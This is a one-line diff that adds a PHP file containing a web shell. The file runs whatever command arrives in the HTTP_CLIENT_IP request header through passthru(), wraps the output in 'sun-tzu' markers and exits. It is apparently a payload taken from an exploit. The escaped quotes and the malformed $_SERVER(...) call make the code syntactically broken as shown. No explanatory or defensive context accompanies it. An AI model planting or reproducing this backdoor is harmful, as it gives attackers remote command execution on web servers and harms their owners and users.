@@ -1,0 +1,1 @@
+<?php set_time_limit(0);echo 'sun-tzu';passthru(\$_SERVER(\"HTTP_CLIENT_IP\");echo 'sun-tzu';die;?>\n
